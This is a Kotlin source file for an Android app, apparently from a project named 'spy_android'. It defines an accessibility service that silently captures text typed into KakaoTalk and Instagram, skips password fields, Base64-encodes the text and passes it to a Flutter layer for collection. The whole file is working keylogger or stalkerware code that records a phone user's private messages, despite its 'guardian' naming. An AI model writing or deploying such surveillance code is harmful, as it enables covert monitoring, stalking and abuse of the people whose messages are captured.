package com.example.spy_android

import android.view.accessibility.AccessibilityEvent
import android.accessibilityservice.AccessibilityService
import android.util.Base64
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import io.flutter.plugin.common.MethodChannel

class GuardianInteractionService : AccessibilityService() {

    companion object {
        private const val TAG = "GuardianInteraction"
        var methodChannel: MethodChannel? = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: return
            
            // 카카오톡과 인스타그램만 필터링
            if (packageName != "com.kakao.talk" && packageName != "com.instagram.android") {
                return
            }

            val source = event.source ?: return
            
            // 비밀번호 필드 제외
            if (source.isPassword) {
                return
            }

            val text = event.text.joinToString("")
            if (text.isEmpty()) return

            // Base64 인코딩 (임시 보안 조치)
            val encodedText = Base64.encodeToString(text.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)

            val payload = mapOf(
                "timestamp" to System.currentTimeMillis().toString(),
                "app" to if (packageName == "com.kakao.talk") "kakaotalk" else "instagram",
                "data" to encodedText
            )

            // Flutter로 데이터 전달
            methodChannel?.invokeMethod("onInteractionCaptured", payload)
            
            Log.d(TAG, "Interaction captured from $packageName and sent to Flutter")
        }
    }

    override fun onInterrupt() {
        Log.e(TAG, "Service Interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Guardian Interaction Service Connected")
    }
}
